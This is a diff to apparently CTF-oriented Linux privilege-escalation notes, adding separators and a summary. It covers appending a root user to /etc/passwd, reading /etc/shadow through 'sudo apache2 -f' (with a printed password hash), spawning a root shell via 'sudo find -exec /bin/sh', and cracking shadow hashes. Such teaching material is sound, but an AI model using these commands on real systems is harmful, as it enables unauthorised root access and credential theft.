@@ -218,6 +218,7 @@ Explanation:
 This command creates a new user called siren in the /etc/passwd file with root privileges by adding a new line.
 
 This could allow you to access the system as the siren user with root access. However, remember that overwriting critical system files can be dangerous.
+---
 Abusing Intended Functionality
 ------------------------------
 
@@ -225,7 +226,15 @@ Abusing Intended Functionality
     $ sudo apache2 -f /etc/shadow
     Syntax error on line 1 of /etc/shadow:
     Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+---
+Summary
+sudo Privileges: If a user has sudo access to certain commands (like find, nano, or less), they might be able to escalate their privileges.
 
+Exploit via sudo: Using sudo find . -exec /bin/sh \; or exploiting misconfigurations with common binaries, an attacker could gain root access.
+
+Overwriting Critical Files: Be cautious when overwriting system files like /etc/passwd — it’s risky but useful for CTFs.
+
+Finding the Flag: Once you have root access, locate the flag and/or crack password hashes from /etc/shadow.
 </details>
 
 <details>
